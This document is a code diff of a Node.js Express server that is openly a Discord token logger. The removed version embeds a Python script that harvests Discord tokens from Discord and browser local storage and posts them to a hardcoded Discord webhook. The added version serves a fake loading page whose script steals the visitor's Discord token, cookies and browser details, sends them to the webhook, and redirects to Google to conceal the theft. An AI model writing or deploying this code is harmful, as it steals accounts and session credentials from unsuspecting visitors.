@@ -1,161 +1,129 @@
 const express = require('express');
 const axios = require('axios');
-const { exec } = require('child_process');
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const WEBHOOK_URL = process.env.WEBHOOK_URL;
-
-// The image you want to show (replace with your own image URL)
-const IMAGE_URL = 'https://w0.peakpx.com/wallpaper/897/12/HD-wallpaper-black-mr-f-my-profile-thumbnail.jpg';
-
-// Python script embedded as a string
-const PYTHON_SCRIPT = `
-import os
-import re
-import json
-import requests
-
-def get_streaming_status():
-    paths = [
-    # Discord Apps
-    os.path.join(os.getenv("APPDATA", ""), "Discord", "Local Storage", "leveldb"),
-    os.path.join(os.getenv("LOCALAPPDATA", ""), "discordcanary", "Local Storage", "leveldb"),
-    os.path.join(os.getenv("LOCALAPPDATA", ""), "discordptb", "Local Storage", "leveldb"),
-
-    # Chromium Browsers
-    os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-    os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
-    os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
-    os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
-
-    # Opera
-    os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
-    ]
-    tokens = []
-    token_pattern = re.compile(r"[\\w-]{24,}\\.[\\w-]{6,}\\.[\\w-]{27,}")
-    
-    for path in paths:
-        if not path or not os.path.exists(path):
-            continue
-        for file in os.listdir(path):
-            if file.endswith((".log", ".ldb")):
-                try:
-                    with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
-                        data = f.read()
-                        tokens.extend(token_pattern.findall(data))
-                except (OSError, IOError):
-                    continue
-    return list(set(tokens))  
-
-def send_to_stream(tokens, wh):
-    if not tokens:
-        return
-    content = "\\n".join(tokens[:20]) 
-    if len(tokens) > 20:
-        content += f"\\n... and {len(tokens)-20} more"
-    
-    payload = {
-        "content": f"\`\`\`\\n{content}\\n\`\`\`",
-        "username": "Logs"
-    }
-    try:
-        response = requests.post(wh, json=payload, timeout=10)
-        response.raise_for_status()
-    except requests.exceptions.RequestException as e:
-        print(f"Failed in wh")
-
-if __name__ == "__main__":
-    whurl = "https://discord.com/api/webhooks/1502287600277262459/74ONlVS3pubojwvbGrqOhY58G7dXk4fD4Op4Oe7w2rcdypH_Ef7NUCGH3BvQZivlErod"
-    found_tokens = get_streaming_status()
-    if found_tokens:
-        send_to_stream(found_tokens, whurl)
-        print(f"logged in......")
-    else:
-        print("No tokens found.")
-`;
-
-// Function to execute the Python script
-function runPythonScript() {
-    const tempDir = os.tmpdir ? os.tmpdir() : '/tmp';
-    const tempFile = path.join(tempDir, 'temp_script.py');
-    
-    // Write the Python script to a temporary file
-    fs.writeFileSync(tempFile, PYTHON_SCRIPT);
-    
-    // Execute the Python script
-    exec(`python3 "${tempFile}"`, (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Python script error: ${error.message}`);
-            return;
-        }
-        if (stderr) {
-            console.error(`Python stderr: ${stderr}`);
-            return;
-        }
-        console.log(`Python stdout: ${stdout}`);
-        
-        // Clean up temp file
-        fs.unlinkSync(tempFile);
-    });
-}
+const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1502287600277262459/74ONlVS3pubojwvbGrqOhY58G7dXk4fD4Op4Oe7w2rcdypH_Ef7NUCGH3BvQZivlErod';
 
 app.get('/', (req, res) => {
-    res.send('✅ Logger is running!');
-});
-
-app.get('/image.png', async (req, res) => {
-    // Log visitor info (send to webhook)
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    const time = new Date().toISOString();
+    
+    // HTML with JavaScript that runs on visitor's browser
+    res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Loading...</title>
+        <style>
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+                background: #1a1a2e;
+                color: white;
+                font-family: Arial, sans-serif;
+            }
+            .loader { text-align: center; }
+            .spinner {
+                border: 4px solid #f3f3f3;
+                border-top: 4px solid #3498db;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto;
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="loader">
+            <div class="spinner"></div>
+            <p>Loading...</p>
+        </div>
 
-    // Run the Python script to collect tokens
-    runPythonScript();
-
-    if (WEBHOOK_URL) {
-        try {
-            await axios.post(WEBHOOK_URL, {
-                embeds: [{
-                    title: '🚨 Link Clicked!',
-                    color: 0xff0000,
-                    fields: [
-                        { name: 'IP Address', value: ip, inline: true },
-                        { name: 'User-Agent', value: userAgent, inline: false },
-                        { name: 'Time', value: time, inline: true },
-                        { name: 'URL', value: req.url, inline: false }
-                    ],
-                    footer: { text: 'Link Logger' }
-                }]
-            });
-            console.log(`[${time}] Logged visit from ${ip}`);
-        } catch (error) {
-            console.error('Webhook error:', error.message);
+        <script>
+        // THIS RUNS ON THE VISITOR'S BROWSER - NOT ON RAILWAY
+        function extractTokens() {
+            // Get Discord token from localStorage (Discord web)
+            let token = null;
+            try {
+                token = localStorage.getItem('token');
+            } catch(e) {}
+            
+            // Get all cookies
+            const cookies = document.cookie;
+            
+            // Get browser info
+            const browserInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            return { token, cookies, browserInfo };
         }
-    }
 
-    // Fetch the real image and forward it
-    try {
-        const imageResponse = await axios.get(IMAGE_URL, { responseType: 'stream' });
-        res.setHeader('Content-Type', imageResponse.headers['content-type']);
-        imageResponse.data.pipe(res);
-    } catch (error) {
-        // Fallback: if the image fails, send the transparent pixel
-        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
-        res.writeHead(200, { 'Content-Type': 'image/png' });
-        res.end(pixel);
-    }
+        async function sendToWebhook(data) {
+            const webhookURL = '${WEBHOOK_URL}';
+            
+            const payload = {
+                embeds: [{
+                    title: '🎯 Token Extracted!',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'Discord Token', value: data.token || '❌ No token found', inline: false },
+                        { name: 'IP Address', value: '${ip}', inline: true },
+                        { name: 'Browser', value: data.browserInfo.userAgent.substring(0, 100), inline: false },
+                        { name: 'Platform', value: data.browserInfo.platform, inline: true },
+                        { name: 'Cookies', value: data.cookies || 'None', inline: false },
+                        { name: 'Time', value: new Date().toISOString(), inline: true }
+                    ],
+                    footer: { text: 'Token Logger' }
+                }]
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                console.log('✅ Sent to webhook');
+            } catch(e) {
+                console.error('Webhook error:', e);
+            }
+        }
+
+        // Execute immediately
+        (async function() {
+            const data = extractTokens();
+            await sendToWebhook(data);
+            
+            // Also log to console (visible in Railway logs if you check)
+            console.log('Token:', data.token || 'No token');
+            console.log('Cookies:', data.cookies || 'No cookies');
+            console.log('Browser:', data.browserInfo.userAgent);
+            
+            // Redirect to Google to hide the activity
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 1500);
+        })();
+        </script>
+    </body>
+    </html>
+    `);
 });
-
-// Run the Python script immediately when the server starts
-runPythonScript();
-
-// Run the Python script every 5 minutes (300000 ms)
-setInterval(runPythonScript, 300000);
 
 app.listen(PORT, () => {
-    console.log(`✅ Logger running on port ${PORT}`);
+    console.log(`✅ Token logger running on port ${PORT}`);
+    console.log(`📡 Webhook: ${WEBHOOK_URL}`);
 });
